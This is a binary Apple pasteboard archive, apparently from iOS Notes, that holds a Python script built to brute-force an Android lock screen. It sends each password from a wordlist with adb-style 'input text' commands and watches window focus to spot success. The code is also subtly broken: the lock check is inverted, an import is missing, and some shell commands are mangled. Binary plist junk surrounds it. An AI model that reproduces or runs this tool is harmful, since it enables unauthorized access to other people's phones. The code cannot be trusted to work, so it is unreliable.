bplist00�
X$versionY$archiverT$topX$objects ��_NSKeyedArchiver�	Troot��+1259=>CGKU$null�_attributedStringData]dataPersisterV$class����WNS.dataO	d�
import py4a
import tqdm

def is_device_locked(device):
    """Check if the device is locked."""
    try:
        output = device.shell('dumpsys window windows | grep mCurrentFocus')
        return 'mFocusedApp' not in output
    except Exception:
        return True

def bruteforce(device, wordlist, delay=0.1):
    """Perform a dictionary attack on the device."""
    with open(wordlist, 'r') as f, tqdm.auto.tqdm(total=sum(1 for line in open(wordlist))) as pbar:
        while True:
            if is_device_locked(device):
                print('[-] Device is locked.')
                return
            for line in f:
                password = line.strip()
                try:
                    with device:
                        device.shell('ime set android.sec.Ime'
                                     'sDefaultId ime=com.android.'
                                     'internal. ClassicIME')
                        device.shell('input text ' + password)
                        time.sleep(delay)
                        output = device.shell('dumpsys window window | grep mCurrentFocus')
                        if 'mFocusedApp' in output:
                            if not device.shell('dumpsys window window | grep mCurrentFocus'
                                                 ' | grep mFocusedApp'):
                                print(f'[+] Found password: {password}')
                                return
                            break
                except Exception as e:
                    print(f'[-] Error trying password {password}: {e}')
            pbar.update(1)
    print('[-] Failed to find password')

if __name__ == '__main__':
    device = py4a.Device()
    wordlist = 'path/TYzen-Bruteforcer-main/wordlist.txt'
    bruteforce(device, wordlist)**(**(**(**(*7*(*W*(**(**(**(**(**(**
(*X*(**(**(**(**(**(**(*Z*(**(**(*<*(**(*�*(**(*%*(**(*�*(**(**(**(*�*(*���Z$classnameX$classes]NSMutableData�]NSMutableDataVNSDataXNSObject� !"#$%&'()*_accumulatedDataSize_objectIdentifierWallURLs_identifierToDataDictionary_cacheDirectoryURL �
�����,-./0WNS.base[NS.relative� ��_�file:///private/var/mobile/Containers/Data/Application/42F0B6FF-EF3F-401B-AD02-0F7BA88F96FC/tmp/pasteboardDataPersister/47FB4080-0783-4046-911A-38D64303B791�34UNSURL�3�678ZNS.objects��	�:;^NSMutableArray�:<WNSArray_$DB04F40A-3415-4F07-A54F-2D88EDA3795A�?6@ABWNS.keys����DE_NSMutableDictionary�DF\NSDictionary�HI_ICDataPersister�J_ICDataPersister�LM_ICNotePasteboardData�N_ICNotePasteboardData    $ ) 2 7 I L Q S e k r � � � � � � � �


 
+
4
B
F
T
[
d
q
�
�
�
�
�
�
�
�
�
�
�
�
�
�
�
� ������������59FK]`rw��             O              �